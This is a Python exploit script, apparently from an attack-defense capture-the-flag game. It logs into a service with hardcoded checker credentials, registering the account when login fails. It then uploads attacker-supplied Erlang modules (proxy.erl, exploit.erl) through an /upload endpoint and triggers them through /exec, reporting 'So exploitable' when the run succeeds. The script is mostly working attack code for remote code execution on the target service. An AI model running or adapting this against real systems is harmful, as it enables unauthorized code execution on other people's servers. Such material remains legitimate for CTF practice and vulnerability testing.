#!/usr/bin/python3

import hashlib, sys, json, time, random, string, urllib, socket, re
import urllib.request
from urllib.parse import *

CheckerLogin="MrChecker"
CheckerPassword="Eaa>NfxVfqnhfkfkf"

def pwn(host, session):
	sys.stderr.write("Uploading script"+"\n")
	evil_code = open('mr/proxy.erl', 'r').read()
	if not upload(host, session, "proxy", evil_code): return False
	sys.stderr.write("Evil code uploaded\n")

	uid = get_id("http://172.16.16.102", session)
	modulename = "code" + hashlib.md5((uid + "proxy").encode()).hexdigest()

	evil_code = open('mr/exploit.erl', 'r').read()
	evil_code = re.sub(re.compile('proxy', re.MULTILINE), modulename, evil_code)

	sys.stderr.write("Uploading script"+"\n")
	if not upload(host, session, "evil_monkey", evil_code): return False
	sys.stderr.write("Pwnage code uploaded\n")

	sys.stderr.write("Executing"+"\n")
	result = mr_exec(host, session, "evil_monkey", {"13" : "37"})
	#sys.stderr.write("Got {0}".format(result)+"\n")

	return result != False

def upload(host, session, name, code):
	data=bytes(json.dumps({ "name" : name, "code" : code }), "ASCII")
	request=urllib.request.Request(host + ":8080/upload", data)
	request.add_header("Content-Type", "application/json")
	request.add_header("Cookie", "session=" + session)
	response = urllib.request.urlopen(request)
	responseJson = json.loads(response.readall().decode('ascii'))
	return responseJson["status"] == "OK"

def mr_exec(host, session, name, data):
	request_json =bytes(json.dumps({ "name" : name, "data" : data }), "ASCII")
	request=urllib.request.Request(host + ":8080/exec", request_json)
	request.add_header("Content-Type", "application/json")
	request.add_header("Cookie", "session=" + session)
	response = urllib.request.urlopen(request)
	responseJson = json.loads(response.readall().decode('ascii'))
	#print(responseJson)
	if responseJson["status"] != "OK": 
		return False
	else:
		return responseJson["result"] 

def get_id(host, session):
	data=bytes(json.dumps({"session": session}), "ASCII")
	request=urllib.request.Request(host + "/user", data)
	request.add_header("X-Requested-With", "XMLHttpRequest")
	request.add_header("Content-Type", "application/json")
	response = urllib.request.urlopen(request)
	responseJson = json.loads(response.readall().decode('ascii'))
	return responseJson["uid"]

def Authorize(host):
	data=bytes(json.dumps({ "login" : CheckerLogin, "password" : CheckerPassword}), "ASCII")
	request=urllib.request.Request(host + "/login", data)
	request.add_header("X-Requested-With", "XMLHttpRequest")
	request.add_header("Content-Type", "application/json")
	response = urllib.request.urlopen(request)
	responseJson = json.loads(response.readall().decode('ascii'))
	if responseJson["status"] != "OK": 
		if responseJson["error"]["code"] == 3:
			registerData = bytes(json.dumps({ "login" : CheckerLogin, "password" : CheckerPassword, "first_name" : "checker", "last_name" : "checker", "language" : "checker" }), "ASCII")
			registerRequest = urllib.request.Request(host + "/register", registerData)
			registerRequest.add_header("X-Requested-With", "XMLHttpRequest")
			registerRequest.add_header("Content-Type", "application/json")
			registerResponse = json.loads(urllib.request.urlopen(registerRequest).readall().decode('ascii'))
			if registerResponse["status"] != "OK":
				sys.stderr.write("Login system corrupted" + "\n")
				exit(110)
			response = urllib.request.urlopen(request)
		else:
			sys.stderr.write("Some weird shit is happening with login system" + "\n")
			exit(110)
	return response.info()["Set-Cookie"].split(";")[0].split("session=")[1]

CheckerHost="http://" + sys.argv[1]
session = Authorize("http://172.16.16.102")
#print(session)
if pwn(CheckerHost, session): 
	print("So exploitable")
	exit(1)
exit(0)
